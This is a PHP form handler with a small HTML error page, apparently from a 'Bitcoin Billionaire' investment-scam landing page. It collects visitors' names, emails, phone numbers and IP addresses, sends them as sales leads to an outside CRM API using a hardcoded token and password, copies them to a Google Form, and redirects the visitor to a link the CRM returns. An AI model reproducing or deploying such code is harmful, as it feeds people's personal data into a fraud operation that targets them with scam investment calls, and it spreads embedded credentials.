
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
</head>
<body>

    <style>
        h1 {
            text-align: center;
            margin-top: 20%;
        }
        button {
            height: 40px;
            width: 260px;
            border: none;
            outline: none;
            background: #437de7;
            color: #fff;
            margin: 20px auto;
            display: block;
            font-size: 22px;
            cursor: pointer;
            border-radius: 3px;
        }
        p {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
    
</body>
</html>

<?php


 
/*************************************************/

$first_name = trim($_POST["f_name"]);
$last_name = trim($_POST["l_name"]);
$email = trim($_POST["email"]);
$phone = trim($_POST["phone"]);
$cCode = trim($_POST["phone2"]);
$countyiso = trim($_POST["countyiso"]);
$userIp = trim($_POST["userip"]);
$siteLink = 'https://masvacukr.cf/Bitcoin_Billionaire_App';
$tel = preg_replace('/[^0-9]/', '', $phone);
$dataApi = array(
        "firstName" => $first_name,
        "lastName" => $last_name, 
        "phoneprefix" => $cCode,
        "phonenumber" => $tel, 
        "email" => $email,
        "token" => "EEYVDGPKDDHLIQYKXOBPNKGJCSTWHSSAOPKUOEPVCUREDYWOZI", 
        "ip" => $userIp, 
        "from" => $siteLink,
        "password" => "Q17387dsq1",
        "offregionvalidator" => '1'
    );

/* var_dump($dataApi);*/
 

 $ch = curl_init();

curl_setopt_array($ch, array(
  CURLOPT_URL => 'https://crmroyal.com/api/addLead',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $dataApi,
));

$response = curl_exec($ch );

  /* echo $response; */  

$json = json_decode($response,true);
$link = $json['link'];


/*if ($json['status'] == 'error') {
    echo '<h1>Ошибка, укажите верные данные</h1><button onclick="window.history.back()">Назад</button>';
}*/if ($json['status'] == 'error') {
    echo '<h1>Error, please enter correct data</h1><p>Wrong phone number <br>'.$cCode.$tel.'</p><button onclick="window.history.back()">Back</button>';
}

/*echo $link;*/

 


  $key = '1FAIpQLSf2SvCnTeDSBvwRGv9UB2Rwh0yzHdbc_bzSeySX_Et2A_dbQw'; 
  $utm = $_SERVER["HTTP_REFERER"];

  $post_data = [
    "entry.1258473708" => $first_name,
    "entry.1956783715" => $last_name,
    "entry.590130112" => $cCode.$tel,
    "entry.147941065" => $email,
    "entry.1524705272" => "DE",
];


   
$url = "https://docs.google.com/forms/d/e/" . $key . "/formResponse";

   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
$response = curl_exec($ch);
curl_close($ch);

/*function getClientIp()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
}*/


 header('Location: '.$link);
